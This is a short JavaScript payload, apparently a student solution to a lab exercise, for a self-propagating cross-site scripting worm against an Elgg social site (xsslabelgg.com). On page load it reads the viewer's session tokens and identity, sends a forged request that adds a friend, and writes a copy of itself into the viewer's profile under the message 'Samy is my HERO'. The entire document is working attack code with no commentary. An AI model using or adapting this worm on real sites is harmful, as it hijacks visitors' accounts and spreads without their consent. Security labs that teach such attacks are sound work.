<script id="worm">
window.onload = function(){
	var ts = "&__elgg_ts=" + elgg.security.token.__elgg_ts;
	var token = "&__elgg_token=" + elgg.security.token.__elgg_token;
	var sendurl = "http://www.xsslabelgg.com/action/friends/add?friend=47" + ts + token;
	var Ajax1 = new XMLHttpRequest();
	Ajax1.open("GET",sendurl,true);
	Ajax1.send();
	var guid = elgg.session.user.guid;
	var name = elgg.session.user.name;
	var wormCode = "<script id=\"worm\">" + document.getElementById("worm").innerHTML + "</" + "script>";
	var desc = "Samy is my HERO (added by Zane and Suraj)" + wormCode;
	var content = "__elgg_token=" + elgg.security.token.__elgg_token +
				  "&__elgg_ts=" + elgg.security.token.__elgg_ts +
				  "&name=" + encodeURIComponent(name) +
				  "&description=" + encodeURIComponent(desc) +
				  "&guid=" + guid;
	var sendurl2 = "http://www.xsslabelgg.com/action/profile/edit";
	var Ajax2 = new XMLHttpRequest();
	Ajax2.open("POST",sendurl2,true);
	Ajax2.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
	Ajax2.send(content);
}
</script>
